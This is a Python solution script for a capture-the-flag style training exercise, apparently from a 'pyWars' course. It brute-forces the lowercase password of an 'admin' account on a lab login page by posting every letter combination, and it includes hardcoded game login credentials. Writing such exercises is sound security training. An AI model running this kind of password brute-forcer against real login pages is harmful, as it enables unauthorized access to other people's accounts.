'''
>>> game.question(12)
"POINTS:4,TIMED:N - Brute force the all lowercase letter password for 'admin'. The web page will give you the flag when you guess the password correctly.
Obtain the URL for target website by reading the data element. "

>>> game.data(12)
'http://10.10.10.20/login2.php'



'''

import pyWars
import requests
import re
import io
import itertools
import time

game = pyWars.exercise()
game.login("mleigh","N0Passw0rd")

    

def answer(data):
    url = data
    ascii_lowercase = 'abcdefghijklmnopqrstuvwxyz'
    counter = 1
    CharLength = 3
    testPass = ''
    for CharLength in range(25):
        passwords = (itertools.product(ascii_lowercase, repeat = CharLength))
        #print(dir(passwords))
        print("\n \n")
        print("currently working on passwords with ", CharLength, " chars")
        print("We have tried ", counter, " possible passwords!")
        #print(passwords)
        for i in passwords:
            for x in i:
                testPass+=x
            print(testPass)
            myobj = {"username":"admin","password":testPass}
            r = requests.post(url,data=myobj)
            testPass = ''
            #print("\n\n")
            #print(r.text)
            if "incorrect" not in r.text:
                print(r.text)
                flag = r.text.split("=")
                return str(flag[1]).strip()
            else:
                counter += 1
 

#game.data(11)        
#print(game.answer(11,"flag=batteredadmin"))
#batteredadmin
print(game.answer(12,answer(game.data(12))))
game.logout
